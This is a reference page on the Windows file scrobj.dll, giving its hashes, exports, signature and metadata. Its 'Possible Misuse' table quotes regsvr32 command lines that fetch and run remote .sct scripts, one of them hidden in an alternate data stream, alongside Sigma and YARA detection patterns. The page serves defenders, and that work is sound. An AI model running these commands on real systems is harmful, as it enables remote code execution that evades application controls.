---
title: scrobj.dll | Windows  Script Component Runtime
excerpt: What is scrobj.dll?
---

# scrobj.dll 

* File Path: `C:\Windows\SysWOW64\scrobj.dll`
* Description: Windows  Script Component Runtime

## Hashes

Type | Hash
-- | --
MD5 | `442A595D99DB56CB07814AE5F5EED74C`
SHA1 | `4C2CD5D6E209536612CCBA717929AA58DE340CA6`
SHA256 | `CA215C034598DBA07891BF053C7693D8AB2F00953F129E78D4D2CAFD9943EF93`
SHA384 | `A898549E7BF04AA6CB90BD70358982BBEEC3732B49D903AC933F28996E8B99A188ACA7EA779D336192A53FA57B883C9B`
SHA512 | `5640DE27A8D774CFBF475CD103C1048D58CA71E53AAD7E62B0BFE1021C76221C512A3AEF7ADCF0C734C60A6C7CC1874359928891294F934DE5586BDAACF52F5B`
SSDEEP | `6144:8q4VHstrCLd5N+qdgvOwiC+bSMPboxKkX9C/GS3:05AmgIToV`
IMP | `2C08B601904F75C621399ABCD595578B`
PESHA1 | `527693E1A7041C0771F82336E7ED680048F01493`
PE256 | `B12BE105B5D83755E8DF16592EA64A335B9694266A665AA6FB16564329DE104F`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`DllUnregisterServer` | 10 | Exported Function
`DllRegisterServerExW` | 9 | Exported Function
`DllUnregisterServerEx` | 11 | Exported Function
`GenerateTypeLibW` | 2 | Exported Function
`GenerateTypeLib` | 1 | Exported Function
`DllRegisterServerExA` | 8 | Exported Function
`DllGetClassObject` | 4 | Exported Function
`DllCanUnloadNow` | 3 | Exported Function
`DllInstall` | 5 | Exported Function
`DllRegisterServerEx` | 7 | Exported Function
`DllRegisterServer` | 6 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: scrobj.dll
* Product Name: Microsoft  Windows  Script Component Runtime
* Company Name: Microsoft Corporation
* File Version: 5.812.10240.16384
* Product Version: 5.812.10240.16384
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/70
* VirusTotal Link: https://www.virustotal.com/gui/file/ca215c034598dba07891bf053c7693d8ab2f00953f129e78d4d2cafd9943ef93/detection/


## Possible Misuse

*The following table contains possible examples of `scrobj.dll` being misused. While `scrobj.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_empiremonkey.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_empiremonkey.yml) | `- '*/i:%APPDATA%\logs.txt scrobj.dll'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `- '*/i:http* scrobj.dll'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `- '*/i:ftp* scrobj.dll'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `Description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmstp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmstp.yml) | `Description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Infdefaultinstall.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml) | `Description: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `- Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `Description: Execute the specified remote .SCT script with scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `- Command: regsvr32.exe /s /u /i:file.sct scrobj.dll` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Regsvr32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | `Description: Execute the specified local .SCT script with scrobj.dll.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Setupapi.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Syssetup.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml) | `Description: Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [problem_report.md](https://github.com/redcanaryco/atomic-red-team/blob/master/.github/ISSUE_TEMPLATE/problem_report.md) | e.g. Run `regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll` | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md) | #{regsvr32path}\#{regsvr32name} /s /u /i:#{filename} scrobj.dll | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md) | #{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [testing.md](https://github.com/redcanaryco/atomic-red-team/blob/master/docs/testing.md) | regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [testing.md](https://github.com/redcanaryco/atomic-red-team/blob/master/docs/testing.md) | - You may observe the scrobj.dll loading on Windows. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_muddywater.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_muddywater.yar) | $x1 = "%11%\\scrobj.dll,NI,c:" wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_cobaltgang.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_cobaltgang.yar) | $x6 = "scrobj.dll','********" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


